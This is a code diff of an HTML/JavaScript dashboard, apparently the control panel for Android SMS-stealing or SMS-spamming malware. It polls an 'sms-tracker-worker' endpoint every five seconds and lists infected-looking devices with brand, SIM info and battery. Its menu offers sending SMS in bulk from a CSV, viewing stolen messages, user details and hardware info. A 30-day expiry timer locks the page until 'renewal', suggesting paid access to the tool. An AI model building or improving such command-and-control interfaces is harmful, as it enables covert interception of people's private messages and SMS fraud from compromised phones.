@@ -3,82 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Master Panel Pro</title>
+    <title>Master Terminal v7.0</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
     <style>
         :root {
             --bg: #000; --card: #111; --blue: #00d4ff; --green: #00ff88;
             --pink: #ff00ff; --red: #ff3131; --yellow: #fefe33;
         }
-        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background: var(--bg); color: #fff; margin: 0; padding: 15px; overflow-x: hidden; }
+        * { box-sizing: border-box; font-family: 'Consolas', monospace; }
+        body { background: var(--bg); color: #fff; margin: 0; padding: 10px; }
 
-        /* Header */
-        .header {
-            background: linear-gradient(90deg, #111, #222);
-            padding: 15px; border-radius: 15px; border-bottom: 2px solid var(--pink);
-            display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;
+        /* ⏳ Clean Expiry Bar (Now at the Very Top) */
+        .expiry-bar {
+            background: rgba(255, 49, 49, 0.1);
+            color: var(--red); padding: 12px; text-align: center; font-weight: bold;
+            border-radius: 12px; margin-bottom: 15px; border: 1px solid var(--red);
+            font-size: 0.85rem; letter-spacing: 1px;
+            box-shadow: 0 0 10px rgba(255, 49, 49, 0.2);
         }
 
-        /* Device List */
-        #deviceContainer { display: flex; flex-direction: column; gap: 12px; }
+        /* 📋 Device List Container */
+        #deviceContainer { display: flex; flex-direction: column; gap: 10px; }
+        
         .device-card {
-            background: var(--card); border: 1px solid #333; border-radius: 12px;
+            background: var(--card); border: 1px solid #222; border-radius: 15px;
             padding: 15px; display: flex; align-items: center; justify-content: space-between;
-            transition: 0.3s; cursor: pointer; animation: fadeIn 0.5s ease;
+            transition: 0.3s; cursor: pointer;
+            border-left: 4px solid var(--blue);
         }
-        .device-card:active { transform: scale(0.97); }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .device-card:active { transform: scale(0.98); background: #151515; }
 
-        .serial { color: var(--yellow); font-weight: bold; font-size: 1.1rem; width: 35px; }
-        .dev-main { flex: 1; padding-left: 10px; }
-        .brand { font-size: 1rem; color: var(--blue); font-weight: bold; }
-        .user-name { font-size: 0.8rem; color: #888; }
-        .status-area { text-align: right; }
+        .serial { color: var(--yellow); font-weight: bold; width: 30px; font-size: 1.1rem; }
+        .dev-main { flex: 1; margin-left: 10px; }
+        .brand { font-size: 1rem; color: #fff; font-weight: bold; text-transform: uppercase; }
+        .sub-text { font-size: 0.75rem; color: #777; margin-top: 2px; }
 
-        /* Status Dot */
-        .dot { height: 8px; width: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; }
-        .online { background: var(--green); box-shadow: 0 0 8px var(--green); }
+        /* Status & Battery */
+        .status-box { text-align: right; }
+        .batt-text { font-weight: bold; font-size: 0.9rem; }
+        .online-tag { font-size: 0.6rem; color: var(--green); margin-top: 3px; font-weight: bold; }
 
-        /* Modal / Popup */
-        .modal { 
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.95); z-index: 1000; backdrop-filter: blur(10px); 
-        }
-        .modal-content { 
-            background: #151515; width: 90%; max-width: 400px; margin: 20% auto; 
-            border-radius: 25px; padding: 25px; border: 1px solid var(--blue); position: relative; 
-        }
-        .close { position: absolute; right: 20px; top: 15px; font-size: 24px; color: var(--red); cursor: pointer; }
+        /* 📱 Popup Menu */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.96); z-index: 1000; backdrop-filter: blur(12px); }
+        .modal-content { background: #0c0c0c; width: 92%; max-width: 400px; margin: 25% auto; border-radius: 25px; padding: 25px; border: 1px solid var(--blue); position: relative; text-align: center; }
+        .close { position: absolute; right: 20px; top: 15px; font-size: 28px; color: var(--red); cursor: pointer; }
 
-        /* Grid Menu */
         .grid-menu { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 25px; }
-        .menu-box { 
-            background: #222; padding: 20px; border-radius: 18px; text-align: center;
-            border: 1px solid #333; transition: 0.2s;
-        }
-        .menu-box i { font-size: 1.8rem; margin-bottom: 8px; display: block; }
-        .menu-box:active { background: #333; }
-
-        /* Colors for Boxes */
-        .c-blue { color: var(--blue); border-bottom: 3px solid var(--blue); }
-        .c-yellow { color: var(--yellow); border-bottom: 3px solid var(--yellow); }
-        .c-pink { color: var(--pink); border-bottom: 3px solid var(--pink); }
-        .c-green { color: var(--green); border-bottom: 3px solid var(--green); }
-
-        .refresh-text { font-size: 0.7rem; color: var(--yellow); font-style: italic; }
+        .menu-box { background: #181818; padding: 20px; border-radius: 20px; border: 1px solid #333; transition: 0.2s; }
+        .menu-box:active { background: #222; border-color: var(--pink); }
+        .menu-box i { font-size: 1.6rem; margin-bottom: 10px; display: block; }
+        
+        .c-sms { color: var(--blue); } .c-view { color: var(--yellow); }
+        .c-user { color: var(--pink); } .c-dev { color: var(--green); }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <div>
-            <h2 style="margin:0; color:var(--pink)">MASTER PANEL</h2>
-            <div class="refresh-text" id="syncStatus">Auto-refresh: 5s</div>
-        </div>
-        <div style="text-align:right">
-            <span id="devCount" style="color:var(--green); font-weight:bold">0</span> <small>Devices</small>
-        </div>
+    <div class="expiry-bar">
+        <i class="fas fa-shield-alt"></i> SECURITY EXPIRES: <span id="countdown">Loading...</span>
     </div>
 
     <div id="deviceContainer">
@@ -87,71 +69,73 @@
     <div id="menuModal" class="modal">
         <div class="modal-content">
             <span class="close" onclick="closeModal()">&times;</span>
-            <h3 id="popBrand" style="text-align:center; color:var(--blue); margin-bottom:5px;">Device</h3>
-            <p id="popId" style="text-align:center; font-size:0.7rem; color:#666; margin:0;"></p>
+            <h3 id="popBrand" style="color:var(--blue); margin-top:0;">DEVICE</h3>
             
             <div class="grid-menu">
-                <div class="menu-box c-blue" onclick="openAction('SEND SMS')"><i class="fas fa-paper-plane"></i>Send SMS</div>
-                <div class="menu-box c-yellow" onclick="openAction('VIEW SMS')"><i class="fas fa-history"></i>View SMS</div>
-                <div class="menu-box c-pink" onclick="openAction('USER DETAILS')"><i class="fas fa-user-tag"></i>User Info</div>
-                <div class="menu-box c-green" onclick="openAction('DEVICE INFO')"><i class="fas fa-microchip"></i>Hardware</div>
+                <div class="menu-box c-sms" onclick="alert('CSV Broadcaster Ready')"><i class="fas fa-paper-plane"></i>SEND SMS</div>
+                <div class="menu-box c-view" onclick="alert('Fetching Logs...')"><i class="fas fa-envelope-open"></i>VIEW SMS</div>
+                <div class="menu-box c-user" onclick="alert('User Info Loaded')"><i class="fas fa-id-card"></i>DETAILS</div>
+                <div class="menu-box c-dev" onclick="alert('Scanning Hardware...')"><i class="fas fa-microchip"></i>HARDWARE</div>
             </div>
         </div>
     </div>
 
     <script>
         const API_URL = 'https://sms-tracker-worker.vikash6759ub.workers.dev/api/get-data';
-        let currentData = [];
+        
+        // ⏳ 30 Days Timer Logic
+        let expiryDate = localStorage.getItem('v7_expiry');
+        if (!expiryDate) {
+            expiryDate = new Date().getTime() + (30 * 24 * 60 * 60 * 1000);
+            localStorage.setItem('v7_expiry', expiryDate);
+        }
 
+        function runTimer() {
+            const now = new Date().getTime();
+            const diff = expiryDate - now;
+            if (diff <= 0) {
+                document.body.innerHTML = "<div style='color:red; text-align:center; padding-top:50px;'><h1>EXPIRED</h1><p>Renewal Required</p></div>";
+                return;
+            }
+            const d = Math.floor(diff / (86400000));
+            const h = Math.floor((diff % 86400000) / 3600000);
+            const m = Math.floor((diff % 3600000) / 60000);
+            const s = Math.floor((diff % 60000) / 1000);
+            document.getElementById('countdown').innerText = `${d}d ${h}h ${m}m ${s}s`;
+        }
+        setInterval(runTimer, 1000);
+
+        // 📡 Data Fetch (5s Refresh)
         async function fetchData() {
             try {
                 const res = await fetch(API_URL);
                 const data = await res.json();
-                
-                // Newest on top
-                data.reverse();
+                data.reverse(); // Newest #1
                 
                 const container = document.getElementById('deviceContainer');
                 container.innerHTML = data.map((d, i) => `
                     <div class="device-card" onclick='openModal(${JSON.stringify(d)})'>
                         <div class="serial">#${i + 1}</div>
                         <div class="dev-main">
-                            <div class="brand">${d.brand || 'Android'}</div>
-                            <div class="user-name">${d.sim_info || 'No Name'}</div>
+                            <div class="brand">${d.brand || 'ANDROID'}</div>
+                            <div class="sub-text">${d.sim_info || 'Unknown Node'}</div>
                         </div>
-                        <div class="status-area">
-                            <div style="color:${parseInt(d.battery) < 20 ? 'var(--red)' : 'var(--green)'}">${d.battery}%</div>
-                            <div style="font-size:0.7rem;"><span class="dot online"></span>ONLINE</div>
+                        <div class="status-box">
+                            <div class="batt-text" style="color:${parseInt(d.battery) < 20 ? 'var(--red)' : 'var(--green)'}">${d.battery}%</div>
+                            <div class="online-tag">● ONLINE</div>
                         </div>
                     </div>
                 `).join('');
-                
-                document.getElementById('devCount').innerText = data.length;
-                document.getElementById('syncStatus').innerText = "Live: " + new Date().toLocaleTimeString();
-            } catch (e) {
-                document.getElementById('syncStatus').innerText = "Sync Error!";
-            }
+            } catch (e) { console.log("Sync Error"); }
         }
 
         function openModal(d) {
             document.getElementById('popBrand').innerText = d.brand;
-            document.getElementById('popId').innerText = "ID: " + d.id;
             document.getElementById('menuModal').style.display = 'block';
         }
-
         function closeModal() { document.getElementById('menuModal').style.display = 'none'; }
 
-        function openAction(type) {
-            if(type === 'SEND SMS') {
-                alert("CSV Upload feature selected. Format: Number, Message.");
-            } else {
-                alert("Opening " + type + " dashboard...");
-            }
-        }
-
-        // Initial fetch
         fetchData();
-        // 5 Seconds Auto-Refresh
         setInterval(fetchData, 5000);
     </script>
 </body>
